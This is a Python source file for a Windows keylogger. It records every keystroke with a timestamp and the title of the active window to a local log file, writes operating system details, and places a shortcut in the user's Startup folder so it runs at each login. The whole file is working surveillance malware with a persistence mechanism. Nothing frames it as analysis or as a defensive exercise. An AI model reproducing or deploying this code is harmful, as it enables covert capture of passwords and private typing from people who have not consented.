import datetime
import platform
import os
import getpass

from datetime import datetime
from pynput.keyboard import Key, Listener
from win32com.client import Dispatch

USER_NAME = getpass.getuser()
name_last_active_window = ""


def add_to_startup():
    startup_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    path = os.path.join(startup_path, "start.lnk")
    file_path = os.path.dirname(os.path.realpath(__file__))
    target = r"%s\start.vbs" % file_path
    wDir = file_path
    icon = r"%s\start.vbs" % file_path
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(path)
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = wDir
    shortcut.IconLocation = icon
    shortcut.save()


def get_active_window():
    import win32gui
    window = win32gui.GetForegroundWindow()
    active_window_name = win32gui.GetWindowText(window)
    return active_window_name


def on_press(key):
    print("{0} pressed".format(key))
    write_file(key)


def write_file(key):
    global name_last_active_window
    f = open("log.txt", "a", encoding='utf-8')
    f.write("\n")
    active_window = str(get_active_window())

    if name_last_active_window != active_window:
        f.write("\n")
        f.write(f"Active window: {active_window}")
        now_time = datetime.now().time().replace(microsecond=0)
        f.write(" ")
        f.write(str(now_time))
        f.write("\n")

    name_last_active_window = active_window
    k = str(key).replace("'", "")
    now_time = datetime.now().time().replace(microsecond=0)
    f.write(str(now_time))
    f.write(' ')
    f.write(k)
    f.close()


def on_release(key):
    if key == Key.esc:
        return False


def main():
    add_to_startup()
    # add_to_startup(file_path="")
    f = open("log.txt", "w", encoding='utf-8')
    f.write("Operating system: ")
    f.write(platform.platform())
    f.write("\n")
    now_data = datetime.now().date()
    f.write(str(now_data))


if __name__ == "__main__":
    main()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
